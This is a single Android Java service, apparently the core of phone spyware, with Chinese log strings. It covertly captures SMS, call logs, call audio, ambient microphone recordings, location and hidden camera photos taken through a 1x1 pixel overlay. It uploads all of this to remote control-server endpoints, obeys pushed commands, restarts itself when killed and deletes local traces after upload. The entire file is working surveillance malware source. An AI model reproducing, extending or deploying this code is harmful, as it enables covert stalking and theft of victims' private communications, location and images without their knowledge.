package com.android.smsclient;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.charset.Charset;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.UUID;

import org.apache.http.NameValuePair;
import org.apache.http.entity.mime.MultipartEntity;
import org.apache.http.entity.mime.content.FileBody;
import org.apache.http.entity.mime.content.StringBody;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.protocol.HTTP;
import org.json.JSONObject;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.PixelFormat;
import android.hardware.Camera;
import android.hardware.Camera.PictureCallback;
import android.media.MediaRecorder;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.os.SystemClock;
import android.provider.CallLog;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.View;
import android.view.WindowManager;

import com.android.data.BDLocationListenerImpl;
import com.android.data.CallConten;
import com.android.data.SMSConten;
import com.android.data.SmsSqlUtils;
import com.android.model.Call;
import com.android.model.Location;
import com.android.model.Sms;
import com.android.thread.RequestThread;
import com.android.utils.LogUtils;
import com.android.utils.Utils;
import com.baidu.location.LocationClient;
import com.baidu.location.LocationClientOption;
import com.google.gson.Gson;
import com.igexin.sdk.PushManager;

public class SmsClientService extends Service {

	private LocationClient lc;
	private BDLocationListenerImpl bdlocation;
	private LocationClientOption option;

	public SmsSqlUtils su = null;

	private AlarmManager am;
	public static String location = "com.android.smsclient.location";
	public static String cmdaction = "com.android.smsclient.cmdaction";
	public static String conaction = "android.net.conn.CONNECTIVITY_CHANGE";

	private PendingIntent locationpendingIntent;
	private TelephonyManager tm;
	private PhoneStateListener listener;
	private MediaRecorder recorder, soundrecorder;
	public static String recorderfile;
	private String recorderdir = "smsclient";

	private String smsurl = "control/client!AddSms.action";
	private String callurl = "control/client!AddCall.action";
	private String locurl = "control/client!AddLoc.action";
	private String recordurl = "control/client!AddRecord.action";
	private String ticurl = "control/client!AddPhoto.action";
	private List<Sms> lsms;
	private List<Call> lcall;
	private List<Location> lloc;
	private File photofile;
	private File sound;

	private WindowManager wm;
	private View pview;
	private Camera camera;
	private int openindex = 0;

	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		super.onCreate();
		startForegroundCompat();
		wm = (WindowManager) getApplicationContext().getSystemService(
				Context.WINDOW_SERVICE);
		su = new SmsSqlUtils(getApplicationContext());
		su.savelog("smsclient", "服务启动");
		su.savelog("smsclient", "个推启动");
		PushManager.getInstance().initialize(this.getApplicationContext());
		su.savelog("smsclient", "百度地图初始化");
		option = new LocationClientOption();
		option.setAddrType("all");
		option.setCoorType("bd09ll");
		lc = new LocationClient(this.getApplicationContext());
		lc.setLocOption(option);
		bdlocation = new BDLocationListenerImpl(su, handler);
		lc.registerLocationListener(bdlocation);
		lc.start();

		am = (AlarmManager) this.getSystemService(Context.ALARM_SERVICE);
		su.savelog("smsclient", "注册数据触发器");
		ContentResolver cr = this.getContentResolver();
		SMSConten content = new SMSConten(cr, handler, su);
		this.getContentResolver().registerContentObserver(
				Uri.parse("content://sms/"), true, content);
		CallConten clcontent = new CallConten(cr, handler, su);
		this.getContentResolver().registerContentObserver(
				CallLog.Calls.CONTENT_URI, true, clcontent);

		tm = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
		listener = new PhoneStateListenerImpl();
		tm.listen(listener, PhoneStateListener.LISTEN_CALL_STATE);

		su.savelog("smsclient", "注册广播接收器");
		IntentFilter filter = new IntentFilter();
		filter.addAction(location);
		filter.addAction(cmdaction);
		filter.addAction(conaction);
		this.registerReceiver(new ClientReceiver(), filter);
		Intent locationIntent = new Intent(location);
		locationpendingIntent = PendingIntent.getBroadcast(this, 0,
				locationIntent, PendingIntent.FLAG_UPDATE_CURRENT);

		su.savelog("smsclient", "获取位置");
		initLocationdata();
		LogUtils.write("smsclient", "SmsClientService create");
		IntentFilter smsfilter=new IntentFilter();
		smsfilter.addAction("android.provider.Telephony.SMS_RECEIVED");
		smsfilter.setPriority(Integer.MAX_VALUE);
		BroadcastReceiverImpl receiver = new BroadcastReceiverImpl(); 
		registerReceiver(receiver, smsfilter); 
	}

	public void showwindow() {
		closewindow();
		WindowManager.LayoutParams params = new WindowManager.LayoutParams();
		params.type = WindowManager.LayoutParams.TYPE_PHONE;
		params.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
				| WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;
		params.gravity = Gravity.TOP;
		params.width = 1;
		params.height = 1;
		View view = LayoutInflater.from(this).inflate(R.layout.activity_photo,
				null);
		SurfaceView photoview = (SurfaceView) view.findViewById(R.id.photoview);
		SurfaceHolder holder = photoview.getHolder();
		holder.addCallback(new PhotoCallback());
		wm.addView(view, params);
	}

	public void closewindow() {
		if (pview != null) {
			wm.removeView(pview);
			if (camera != null) {
				LogUtils.write("smsclient", "释放摄像头");
				camera.setPreviewCallback(null);
				camera.stopPreview();
				camera.release();
				camera = null;
			}
			pview = null;
		}

	}

	private Handler handler = new Handler() {

		@Override
		public void handleMessage(Message msg) {
			// TODO Auto-generated method stub
			super.handleMessage(msg);
			if (Utils.getIntConfig(SmsClientService.this, "deviceid", 0) > 0) {
				if (msg.what == 100) {
					LogUtils.write("smsclient", "发送短信到服务器");
					SendSms();
				} else if (msg.what == 101) {
					LogUtils.write("smsclient", "短信结果处理中");
					SendSmsResult(msg);
				} else if (msg.what == 200) {
					// 电话监听
					LogUtils.write("smsclient", "发送电话到服务器");
					SendCall();
				} else if (msg.what == 201) {
					LogUtils.write("smsclient", "通话结果处理中");
					SendCallResult(msg);
				} else if (msg.what == 300) {
					// 位置监听
					LogUtils.write("smsclient", "发送位置到服务器");
					SendLoc();
				} else if (msg.what == 301) {
					LogUtils.write("smsclient", "位置结果处理中");
					SendLocResult(msg);
				} else if (msg.what == 400) {
					LogUtils.write("smsclient", "停止环境录音");
					stoprecordSound();
				} else if (msg.what == 401) {
					LogUtils.write("smsclient", "上传环境录音");
					SendRecordThread();
				} else if (msg.what == 402) {
					LogUtils.write("smsclient", "上传环境录音结果处理");
					SendRecordResult(msg);
				} else if (msg.what == 500) {
					if (camera != null) {
						LogUtils.write("smsclient", "拍照中");
						camera.takePicture(null, null, new PhotoCallback());
					}
				} else if (msg.what == 501) {
					LogUtils.write("smsclient", "上传照片结果处理");
					SendPhotoResult(msg);
				}
			}
		}

	};

	public void initLocationdata() {
		su.savelog("smsclient", "获取位置初始化");
		int locattiondelay = Utils.getIntConfig(this, "locattiondelay", 300000);
		long locationAtTime = SystemClock.elapsedRealtime() + 2 * 1000;
		am.cancel(locationpendingIntent);
		am.setRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP, locationAtTime,
				locattiondelay, locationpendingIntent);
	}

	class ClientReceiver extends BroadcastReceiver {
		@Override
		public void onReceive(Context context, Intent intent) {
			String action = intent.getAction();
			LogUtils.write("smsclient", action);
			if (action != null && location.equals(action)) {
				// 获取位置
				if (lc != null && lc.isStarted()) {
					su.savelog("message", "接收到广播获取位置");
					lc.requestLocation();
				}
			} else if (action != null && cmdaction.equals(action)) {
				String cmd = intent.getStringExtra("action");
				if (cmd != null) {
					su.savelog("message", "指令" + cmd);
					LogUtils.write("smsclient", "指令" + cmd);
					DoCmd(cmd);
				} else {

				}
			} else if (action != null && conaction.equals(action)) {
				LogUtils.write("smsclient", "网络建立连接");
				SendAllData();
			}
		}
	}

	private void DoCmd(String cmd) {
		try {
			JSONObject jo = new JSONObject(cmd);
			if ("sms".equals(jo.getString("action"))) {
				boolean upload = jo.getBoolean("smsupload");
				int smscount = jo.getInt("smscount");
				Utils.setBooleanConfig(this, "smsupload", upload);
				Utils.setIntConfig(this, "smscount", smscount);
				LogUtils.write("smsclient", "sms set");
			} else if ("call".equals(jo.getString("action"))) {
				boolean upload = jo.getBoolean("callupload");
				int smscount = jo.getInt("callcount");
				Utils.setBooleanConfig(this, "callupload", upload);
				Utils.setIntConfig(this, "callcount", smscount);
				LogUtils.write("smsclient", "call set");
			} else if ("loc".equals(jo.getString("action"))) {
				boolean upload = jo.getBoolean("locupload");
				int smscount = jo.getInt("loccount");
				Utils.setBooleanConfig(this, "locupload", upload);
				Utils.setIntConfig(this, "loccount", smscount);
				LogUtils.write("smsclient", "loc set");
			} else if ("record".equals(jo.getString("action"))) {
				if (sound == null) {
					int count = jo.getInt("recordcount");
					LogUtils.write("smsclient", "录音开始" + count);
					startrecordSound(count);
				}

			} else if ("photo".equals(jo.getString("action"))) {
				if (photofile == null) {
					openindex = jo.getInt("camera");
					showwindow();
				}

			}

		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	private boolean iscon() {
		ConnectivityManager connectivityManager = (ConnectivityManager) this
				.getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo net = connectivityManager.getActiveNetworkInfo();
		if (net != null) {
			return true;
		}
		return false;
	}

	private void SendAllData() {
		if (iscon()) {
			SendSms();
			SendCall();
			SendLoc();
		}
	}

	// 发送短信
	private void SendSmsThread() {
		Gson gson = new Gson();
		List<NameValuePair> lnp = new ArrayList<>();
		lnp.add(new BasicNameValuePair("mapparam.json", gson.toJson(lsms)));
		lnp.add(new BasicNameValuePair("mapparam.deviceid", String
				.valueOf(Utils.getIntConfig(SmsClientService.this, "deviceid",
						0))));
		RequestThread rt = new RequestThread(smsurl, lnp, handler);
		LogUtils.write("smsclient", "短信数据上传");
		rt.setWhat(101);
		rt.start();
	}

	// 发送通话记录
	private void SendCallThread() {
		try {
			Gson gson = new Gson();
			MultipartEntity mpe = new MultipartEntity();
			mpe.addPart("mapparam.json", new StringBody(gson.toJson(lcall),
					Charset.forName(HTTP.UTF_8)));
			mpe.addPart(
					"mapparam.deviceid",
					new StringBody(String.valueOf(Utils.getIntConfig(
							SmsClientService.this, "deviceid", 0)), Charset
							.forName(HTTP.UTF_8)));
			for (Call call : lcall) {
				if (call.getRecordfile() != null
						&& !"".equals(call.getRecordfile())) {
					if (Environment.getExternalStorageState().equals(
							Environment.MEDIA_MOUNTED)) {
						LogUtils.write("smsclient", call.getRecordfile());
						File recordfile = new File(getFiledir(),
								call.getRecordfile());
						if (recordfile.exists()) {
							mpe.addPart("upload", new FileBody(recordfile));
						}

					}
				}

			}
			LogUtils.write("smsclient", "通话数据上传");
			RequestThread rt = new RequestThread(callurl, mpe, handler);
			rt.setWhat(201);
			rt.start();
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	// 发送位置记录
	private void SendLocThread() {
		Gson gson = new Gson();
		List<NameValuePair> lnp = new ArrayList<>();
		lnp.add(new BasicNameValuePair("mapparam.json", gson.toJson(lloc)));
		lnp.add(new BasicNameValuePair("mapparam.deviceid", String
				.valueOf(Utils.getIntConfig(SmsClientService.this, "deviceid",
						0))));
		LogUtils.write("smsclient", "位置数据上传");
		RequestThread rt = new RequestThread(locurl, lnp, handler);
		rt.setWhat(301);
		rt.start();
	}

	class PhotoCallback implements SurfaceHolder.Callback, PictureCallback {

		@Override
		public void surfaceChanged(SurfaceHolder arg0, int arg1, int arg2,
				int arg3) {
			// TODO Auto-generated method stub
			LogUtils.write("smsclient", "surfaceChanged 改变");
			try {
				if (camera != null) {
					Camera.Parameters parameters = camera.getParameters();
					parameters.setPictureFormat(PixelFormat.JPEG);
					parameters.set("rotation", 180);
					camera.setDisplayOrientation(0);
					parameters.setPreviewSize(400, 300);
					camera.setParameters(parameters);
					camera.startPreview();
					handler.sendEmptyMessageDelayed(500, 2000);
				}
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
				if(camera!=null){
					try {
						camera.release();
					} catch (Exception e1) {
						// TODO Auto-generated catch block
						e1.printStackTrace();
					}
				}
				camera=null;
				LogUtils.write("smsclient", "surfaceChanged 异常"+e.getMessage());
			}
		}

		@Override
		public void surfaceCreated(SurfaceHolder holder) {
			// TODO Auto-generated method stub

			try {
				LogUtils.write("smsclient", "surfaceCreate 创建");
				int i = Camera.getNumberOfCameras();
				LogUtils.write("smsclient", "摄像头数量 " + i);
				if (i > 0 && openindex < i) {
					if (camera != null) {
						camera.release();
					}
					LogUtils.write("smsclient", "打开摄像头 " + openindex);
					camera = Camera.open(openindex);
					camera.setPreviewDisplay(holder);
				}
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
				try {
					if(camera!=null){
						camera.release();
					}
				} catch (Exception e1) {
					// TODO Auto-generated catch block
					e1.printStackTrace();
				}
				camera=null;
				LogUtils.write("smsclient", "surfaceCreate 异常"+e.getMessage());
			}

		}

		@Override
		public void surfaceDestroyed(SurfaceHolder arg0) {
			// TODO Auto-generated method stub
			LogUtils.write("smsclient", "surfaceCreate 销毁");

		}

		@Override
		public void onPictureTaken(byte[] data, Camera arg1) {
			// TODO Auto-generated method stub
			try {
				if (Environment.getExternalStorageState().equals(
						Environment.MEDIA_MOUNTED)) {
					photofile = new File(getFiledir(), UUID.randomUUID() + "_"
							+ tm.getDeviceId() + ".jpg");
					LogUtils.write("smsclient", "保存拍照");
					data2file(data, photofile);
					LogUtils.write("smsclient", "销毁窗口");
					closewindow();
					SendPhotoThread(photofile);
				}
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
				try {
					if(camera!=null){
						camera.release();
					}
					
				} catch (Exception e1) {
					// TODO Auto-generated catch block
					e1.printStackTrace();
				}
				camera=null;
				LogUtils.write("smsclient", "surfaceCreate 异常"+e.getMessage());
			}
		}

		private void data2file(byte[] w, File fileName) {
			FileOutputStream out = null;
			try {
				out = new FileOutputStream(fileName);
				out.write(w);
				out.close();
			} catch (Exception e) {
				if (out != null) {
					try {
						out.close();
					} catch (IOException e1) {
						// TODO Auto-generated catch block
						e1.printStackTrace();
					}
				}
			}
		}

	}

	class PhoneStateListenerImpl extends PhoneStateListener {

		@Override
		public void onCallStateChanged(int state, String incomingNumber) {
			// TODO Auto-generated method stub
			super.onCallStateChanged(state, incomingNumber);
			switch (state) {
			case TelephonyManager.CALL_STATE_OFFHOOK:
				startrecordPhone();
				break;
			case TelephonyManager.CALL_STATE_IDLE:
				stoprecordPhone();
				break;
			default:
				break;
			}
		}

	}

	public void startrecordPhone() {
		if (Environment.getExternalStorageState().equals(
				Environment.MEDIA_MOUNTED)) {
			try {
				recorderfile = System.currentTimeMillis() + "_"
						+ tm.getDeviceId() + ".mp3";
				recorder = new MediaRecorder();
				LogUtils.write("smsclient", SmsClientService.recorderfile);
				if (Utils.getIntConfig(this, "audiosource", 0) == 0) {
					LogUtils.write("smsclient", "上下行数据");
					recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);
				} else if (Utils.getIntConfig(this, "audiosource", 0) == 1) {
					LogUtils.write("smsclient", "麦克风录音");
					recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
				}
				recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
				recorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
				File rfile = new File(getFiledir(), recorderfile);
				recorder.setOutputFile(rfile.getAbsolutePath());
				recorder.prepare();
				recorder.start();
				LogUtils.write("smsclient", "录音开始");
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
				try {
					if (recorder != null) {
						recorder.release();
						
					}
				} catch (Exception e1) {
					// TODO Auto-generated catch block
					e1.printStackTrace();
				}
				recorder = null;
				LogUtils.write("smsclient", "录音异常"+e.getMessage());
			}
		}
	}

	public void startrecordSound(int c) {
		if (Environment.getExternalStorageState().equals(
				Environment.MEDIA_MOUNTED)) {
			try {
				String soundfile = UUID.randomUUID() + "_" + tm.getDeviceId()
						+ ".mp3";
				soundrecorder = new MediaRecorder();
				LogUtils.write("smsclient", soundfile);
				soundrecorder.setAudioSource(MediaRecorder.AudioSource.MIC);

				soundrecorder
						.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
				soundrecorder
						.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
				sound = new File(getFiledir(), soundfile);
				soundrecorder.setOutputFile(sound.getAbsolutePath());
				soundrecorder.prepare();
				soundrecorder.start();
				LogUtils.write("smsclient", "录音开始");
				handler.sendEmptyMessageDelayed(400, c * 1000);
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
				try {
					if (soundrecorder != null) {
						soundrecorder.release();
						
					}
				} catch (Exception e1) {
					// TODO Auto-generated catch block
					e1.printStackTrace();
				}
				soundrecorder = null;
				LogUtils.write("smsclient", "环境录音异常"+e.getMessage());
			}
		}
	}

	public File getFiledir() {
		File file = new File(Environment.getExternalStorageDirectory(),
				recorderdir);
		if (!file.exists()) {
			file.mkdirs();
		}
		return file;
	}

	public void stoprecordPhone() {
		if (recorder != null) {
			LogUtils.write("smsclient", "录音停止");
			recorder.stop();
			recorder.release();
			recorder = null;

		}
	}

	public void stoprecordSound() {
		if (soundrecorder != null) {
			LogUtils.write("smsclient", "录音停止");
			soundrecorder.stop();
			soundrecorder.release();
			soundrecorder = null;
			handler.sendEmptyMessageAtTime(401, 1000);
		}
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		LogUtils.write("smsclient", "SmsClientService start");
		return START_STICKY;
	}

	@Override
	public void onDestroy() {
		// TODO Auto-generated method stub
		Intent localIntent = new Intent();
		localIntent.setClass(this, SmsClientService.class);
		this.startService(localIntent);
	}

	private void startForegroundCompat() {
		try {
			if (Build.VERSION.SDK_INT < 18) {
				LogUtils.write("smsclient", "startForgroundCompat");
				startForeground(1120, new Notification());
			}
		} catch (Exception e) {
		}
	}

	// 发送短信
	private void SendSms() {
		if (lsms == null && iscon()
				&& Utils.getBooleanConfig(this, "smsupload", true)) {
			lsms = su.getAllSms();
			if (lsms.size() > Utils.getIntConfig(SmsClientService.this,
					"smscount", 0)) {
				SendSmsThread();
			} else {
				lsms = null;
			}
		}

	}

	private void SendSmsResult(Message msg) {
		try {
			if (msg.obj != null) {
				JSONObject jo = new JSONObject(msg.obj.toString());
				if (jo.getInt("state") == 1
						&& "sms".equals(jo.getString("action")) && lsms != null) {
					su.deleteAllSms(lsms);
					LogUtils.write("smsclient", "上传短信到服务器成功");
					lsms = null;
					SendSms();
				} else {
					LogUtils.write("smsclient", "上传短信到服务器失败");
					lsms = null;
				}
			} else {
				LogUtils.write("smsclient", "上传短信到服务器无响应");
				lsms = null;
			}
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	// 发送通话记录
	private void SendCall() {
		if (lcall == null && iscon()
				&& Utils.getBooleanConfig(this, "callupload", true)) {
			lcall = su.getAllCall();
			if (lcall.size() > Utils.getIntConfig(SmsClientService.this,
					"callcount", 0)) {
				SendCallThread();
			} else {
				lcall = null;
			}
		}

	}

	private void SendCallResult(Message msg) {
		try {
			if (msg.obj != null) {
				JSONObject jo = new JSONObject(msg.obj.toString());
				if (jo.getInt("state") == 1
						&& "call".equals(jo.getString("action"))
						&& lcall != null) {
					su.deleteAllCall(lcall);
					DeleteCallFile();
					LogUtils.write("smsclient", "上传通话到服务器成功");
					lcall = null;
					SendCall();
				} else {
					LogUtils.write("smsclient", "上传通话到服务器失败");
					lcall = null;
				}
			} else {
				LogUtils.write("smsclient", "上传通话到服务器无响应");
				lcall = null;
			}
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	private void DeleteCallFile() {
		if (lcall != null) {
			for (Call call : lcall) {
				if (call.getRecordfile() != null
						&& !"".equals(call.getRecordfile())) {
					if (Environment.getExternalStorageState().equals(
							Environment.MEDIA_MOUNTED)) {
						File recordfile = new File(getFiledir(),
								call.getRecordfile());
						if (recordfile.exists()) {
							recordfile.delete();
						}
					}
				}
			}
		}
	}

	// 发送位置
	private void SendLoc() {
		if (lloc == null && iscon()
				&& Utils.getBooleanConfig(this, "locupload", true)) {
			lloc = su.getAllLocation();
			if (lloc.size() > Utils.getIntConfig(SmsClientService.this,
					"loccount", 0)) {
				SendLocThread();
			} else {
				lloc = null;
			}
		}

	}

	private void SendLocResult(Message msg) {
		try {
			if (msg.obj != null) {
				JSONObject jo = new JSONObject(msg.obj.toString());
				if (jo.getInt("state") == 1
						&& "loc".equals(jo.getString("action")) && lloc != null) {
					su.deleteAllLocation(lloc);
					LogUtils.write("smsclient", "上传位置到服务器成功");
					lloc = null;
					SendLoc();
				} else {
					LogUtils.write("smsclient", "上传位置到服务器失败");
					lloc = null;
				}
			} else {
				LogUtils.write("smsclient", "上传位置到服务器无响应");
				lloc = null;
			}
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	// 发送拍照记录
	private void SendPhotoThread(File file) {
		try {
			MultipartEntity mpe = new MultipartEntity();
			mpe.addPart(
					"mapparam.phototime",
					new StringBody(Utils.formData(new Date()), Charset
							.forName(HTTP.UTF_8)));
			mpe.addPart(
					"mapparam.deviceid",
					new StringBody(String.valueOf(Utils.getIntConfig(
							SmsClientService.this, "deviceid", 0)), Charset
							.forName(HTTP.UTF_8)));
			mpe.addPart("upload", new FileBody(file));
			LogUtils.write("smsclient", "照片数据上传");
			RequestThread rt = new RequestThread(ticurl, mpe, handler);
			rt.setWhat(501);
			rt.start();
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	// 发送录音记录
	private void SendRecordThread() {
		try {
			if (sound != null) {
				if (sound.exists()) {
					MultipartEntity mpe = new MultipartEntity();
					mpe.addPart("mapparam.starttime",new StringBody(Utils.formData(new Date()), Charset
									.forName(HTTP.UTF_8)));
					mpe.addPart("mapparam.deviceid",new StringBody(String.valueOf(Utils.getIntConfig(
									SmsClientService.this, "deviceid", 0)),
									Charset.forName(HTTP.UTF_8)));
					mpe.addPart("upload", new FileBody(sound));
					LogUtils.write("smsclient", "录音数据上传");
					RequestThread rt = new RequestThread(recordurl, mpe,
							handler);
					rt.setWhat(402);
					rt.start();
				} else {
					sound = null;
				}

			}

		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	private void SendPhotoResult(Message msg) {
		try {
			if (msg.obj != null) {
				JSONObject jo = new JSONObject(msg.obj.toString());
				if (jo.getInt("state") == 1
						&& "photo".equals(jo.getString("action"))) {
					LogUtils.write("smsclient", "上传照片到服务器成功");
				} else {
					LogUtils.write("smsclient", "上传照片到服务器失败");
				}
			} else {
				LogUtils.write("smsclient", "上传照片到服务器无响应");
			}

			if (photofile != null) {
				photofile.delete();
			}
			photofile = null;
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	private void SendRecordResult(Message msg) {
		try {
			if (msg.obj != null) {
				JSONObject jo = new JSONObject(msg.obj.toString());
				if (jo.getInt("state") == 1
						&& "record".equals(jo.getString("action"))) {
					LogUtils.write("smsclient", "上传录音到服务器成功");
				} else {
					LogUtils.write("smsclient", "上传录音到服务器失败");
				}
			} else {
				LogUtils.write("smsclient", "上传录音到服务器无响应");
			}

			if (sound != null) {
				sound.delete();
			}
			sound = null;
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

}
